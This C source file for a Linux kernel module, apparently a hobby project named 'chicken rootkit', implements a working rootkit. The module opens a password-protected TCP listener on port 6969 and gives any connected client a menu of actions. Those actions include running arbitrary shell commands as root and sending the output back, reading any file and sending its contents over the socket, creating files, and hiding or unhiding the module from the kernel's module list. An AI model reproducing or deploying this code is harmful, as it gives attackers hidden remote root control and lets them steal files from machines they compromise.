#include <asm/segment.h>
#include <linux/cred.h>
#include <linux/ctype.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>

#include "ascii.h"
#include "hide.h"
#include "utils.h"

#define PORT 6969
#define MAX_BUFFER_SIZE 1024
#define MAX_FILEPATH_LENGTH 128

int print_to_socket(struct socket *socket, const char *message)
{
    struct msghdr msg;
    struct kvec iov;
    int len;

    // Set up message header and IO vector struct
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = (void *)message;
    iov.iov_len = strlen(message);
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = NULL;
    msg.msg_namelen = 0;

    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, iov.iov_len);

    // Send the message to the socket
    len = kernel_sendmsg(socket, &msg, &iov, 1, iov.iov_len);
    if (len < 0)
        printk(KERN_ERR "chicken_rk: Error sending file content\n");
    return 0;
}

void run_cmd(char *command)
{
    int ret;
    char cmd[MAX_BUFFER_SIZE];

    snprintf(cmd, sizeof(cmd), "%s > /tmp/rk/output 2> /tmp/rk/error", command);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "HOME=/", "TERM=linux",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL, NULL };

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void print_menu(struct socket sock)
{
    // Send welcome message
    char *welcome_msg = "\nWelcome to chicken rootkit, best rootkit on the "
                        "market because of chicken\n"
                        "   MENU  \n"
                        "| menu		| Display menu\n"
                        "| create <file> | Create a file \n"
                        "| read <file> 	| Read a file \n"
                        "| cmd <cmd>     | Run a command in a root shell\n"
                        "| getconfig      | Get host config\n"
                        "| chicken <X> 	| Spawn X chicken on the pc\n"
                        "| unhide    	| Unhide the kernel module\n"
                        "| hide          | Hide the kernel module\n"
                        "| exit     	| Exit rk console \n";
    print_to_socket(&sock, welcome_msg);
}

void send_chickens(struct socket sock, int nb_chicks)
{
    struct file *file;
    char full_path[50];

    for (int i = 0; i < nb_chicks; i++)
    {
        snprintf(full_path, sizeof(full_path), "/root/chicken%d.quack", i);
        file = filp_open(full_path, O_CREAT | O_WRONLY | O_TRUNC, 0644);

        if (IS_ERR(file))
        {
            printk(KERN_ERR "chicken_rk: Error opening file: %s\n", full_path);
            continue;
        }

        ssize_t len = kernel_write(file, chicken_ass, strlen(chicken_ass), 0);
        if (len < 0)
            printk(KERN_ERR "chicken_rk: Error writing to file: %s\n",
                   full_path);

        filp_close(file, NULL);
    }
}

int send_file_content(struct socket *sock, const char *filepath)
{
    struct file *filep;
    struct kvec vec;
    struct msghdr msg;
    loff_t pos = 0;
    ssize_t read_len;
    char *buf = kmalloc(4096, GFP_KERNEL); // Buffer size of 4096
    int error = 0;

    if (!buf)
    {
        printk(KERN_ERR "chicken_rk: Error allocating memory\n");
        return -ENOMEM;
    }

    filep = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(filep))
    {
        printk(KERN_ERR "chicken_rk: Error opening the file: %s\n", filepath);
        kfree(buf);
        return PTR_ERR(filep);
    }

    while ((read_len = kernel_read(filep, buf, 4096, &pos)) > 0)
    {
        vec.iov_len = read_len;
        vec.iov_base = buf;

        memset(&msg, 0, sizeof(msg));
        iov_iter_kvec(&msg.msg_iter, WRITE, &vec, 1, read_len);
        msg.msg_flags = MSG_NOSIGNAL;
        error = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
        if (error < 0)
        {
            printk(KERN_ERR "chicken_rk: Error sending file content\n");
            break;
        }
    }

    filp_close(filep, NULL);
    kfree(buf);

    if (read_len < 0)
    {
        printk(KERN_ERR "chicken_rk: Error during reading file\n");
        return read_len;
    }

    return error;
}
int create_file(char *file_path)
{
    int ret;
    char *argv[] = { "/bin/touch", file_path, NULL };
    char *envp[] = { "HOME=/", "TERM=linux",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                     "OUTPUT_FILE=/tmp/output.txt", NULL };

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    if (ret != 0)
    {
        printk(KERN_ERR "chicken_rk: Error executing user-mode program\n");
        return ret;
    }

    return 0;
}

int handle_client(struct socket *new_socket)
{
    struct msghdr msg;
    struct kvec iov;
    char *buf = NULL;
    int len, ret;
    int should_exit = 0;

    // Allocate memory for buffer
    buf = kmalloc(MAX_BUFFER_SIZE, GFP_KERNEL);
    if (!buf)
    {
#ifndef DEBUG
        printk(KERN_ERR "chicken_rk: Error allocating memory for buffer\n");
#endif
        return -1;
    }

    // Set up message header and IO vector struct needed by kernel_sendmsg
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = buf;
    iov.iov_len = MAX_BUFFER_SIZE;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = NULL;
    msg.msg_namelen = 0;

    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, MAX_BUFFER_SIZE);
#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: Remote user connected\n");
#endif

    print_menu(*new_socket);

    while (!should_exit)
    {
        print_to_socket(new_socket, "(chikenRK) ");
        len = kernel_recvmsg(new_socket, &msg, &iov, 1, MAX_BUFFER_SIZE, 0);

        // Null-terminate the buffer
        buf[len] = '\0';

        // remove \n because kernel_recvmsg add a \n at the end
        if (len > 0 && buf[len - 1] == '\n')
            buf[len - 1] = '\0';

#ifndef DEBUG
        printk(KERN_INFO "chicken_rk: Command received: %s\n", buf);
#endif

        //   exit 	  | To exit rk console
        if (strncmp(buf, "exit", 4) == 0)
            should_exit = 1;

        //  read <file>   | read a file
        else if (strncmp(buf, "read ", 5) == 0)
        {
            char filepath[MAX_FILEPATH_LENGTH];
            if (sscanf(buf + 5, "%s", filepath) == 1)
                send_file_content(new_socket, filepath);
        }

        //  chicken <X>   | to spawn X chicken on the pc
        else if (strncmp(buf, "chicken ", 8) == 0)
        {
            int num_chickens;
            if (sscanf(buf + 8, "%d", &num_chickens) == 1)
                send_chickens(*new_socket, num_chickens);
        }
        //  create <file> | Create a file on the infected pc , needed to input
        //  full path for the file
        else if (strncmp(buf, "create ", 7) == 0)
        {
            char *file_path = buf + 7;

            ret = create_file(file_path);
            if (ret != 0)
            {
                kfree(buf);
                return ret;
            }
        }
        //   hide 	  | hide the kernel module
        else if (strncmp(buf, "hide", 4) == 0)
            unlink_module(THIS_MODULE);
        //  unhide 	  | unhide the kernel module
        else if (strncmp(buf, "unhide", 6) == 0)
            relink_module(THIS_MODULE);
        else if (strncmp(buf, "menu", 4) == 0)
            print_menu(*new_socket);
        // cmd <command> | execute a shell command
        else if (strncmp(buf, "cmd ", 4) == 0)
        {
            char *command = buf + 4;
            run_cmd(command);
            send_file_content(new_socket, "/tmp/rk/output");
        }
        else if (strncmp(buf, "getconfig", 9) == 0)
        {
            send_file_content(new_socket, "/tmp/rk/config.txt");
        }
        else
        {
            print_to_socket(new_socket,
                            "This command does not exist, please refere to the "
                            "menu\n type 'menu' to display the menu\n");
#ifndef DEBUG
            printk(KERN_INFO "Not implemented yet :%s\n", buf);
#endif
        }
    }

#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: Remote user disconnected\n");
#endif
    kfree(buf);
    return 0;
}

int handle_connections(struct socket *socket)
{
    struct socket *new_socket;
    int error;

    while (!kthread_should_stop())
    {
        // Accept new connections
        error = kernel_accept(socket, &new_socket, 0);
        if (error < 0)
        {
#ifndef DEBUG
            printk(KERN_ERR "Error accepting connection\n");
#endif
            continue;
        }

        // Send password prompt
        print_to_socket(new_socket, "Enter password to continue: ");
        // Receive password from client
        char received_password[MAX_BUFFER_SIZE];
        struct msghdr msg;
        struct kvec iov;
        memset(&msg, 0, sizeof(msg));
        iov.iov_base = received_password;
        iov.iov_len = sizeof(received_password);
        msg.msg_control = NULL;
        msg.msg_controllen = 0;
        msg.msg_flags = 0;
        msg.msg_name = NULL;
        msg.msg_namelen = 0;
        iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, sizeof(received_password));

        int len = kernel_recvmsg(new_socket, &msg, &iov, 1,
                                 sizeof(received_password), 0);
        received_password[len] = '\0';

        int i;
        for (i = 0; i < len; i++)
            received_password[i] = tolower(received_password[i]);

        if (check_password(received_password) != 0)
        {
            print_to_socket(new_socket, "Wrong password, byebye\n");

#ifndef DEBUG
            printk(KERN_INFO "chicken_rk: Wrong password: %s\n",
                   received_password);
#endif
            sock_release(new_socket);
            continue;
        }
#ifndef DEBUG
        printk(KERN_INFO "chicken_rk: Correct password, user connected\n");
#endif
        handle_client(new_socket);

        sock_release(new_socket);
    }

    return 0;
}

int create_socket(struct socket **new_socket, struct task_struct **task)
{
    struct socket *sock;
    struct sockaddr_in sin;
    int err;

    // Set up the address struct with the port number
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_port = htons(PORT);

    // Create the socket
    // AF_INET = ipv4 | AF_INET6 = ipv6
    // SOCK_STREAM = TCP | SOCK_DGRAM = UDP
    // IPPROTO_TCP = TCP | IPPROTO_UDP = UDP
    err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (err < 0)
    {
#ifndef DEBUG
        printk(KERN_ERR "Error creating socket\n");
#endif
        return err;
    }

    // Bind the socket to the address
    // binding an addresses is an association between service and ip
    err = kernel_bind(sock, (struct sockaddr *)&sin, sizeof(sin));
    if (err < 0)
    {
        sock_release(sock);
        return err;
    }

    // Start listening for connections
    err = kernel_listen(sock, 10);
    if (err < 0)
    {
        sock_release(sock);
        return err;
    }

    // Create a kernel thread to handle incoming connections
    *task = kthread_run((int (*)(void *))handle_connections, sock,
                        "rk_handle_connections");
    if (IS_ERR(*task))
    {
        err = PTR_ERR(*task);
        *task = NULL;
        sock_release(sock);
        return err;
    }

    *new_socket = sock;
#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: Socket well created on port %d\n", PORT);
#endif
    return 0;
}
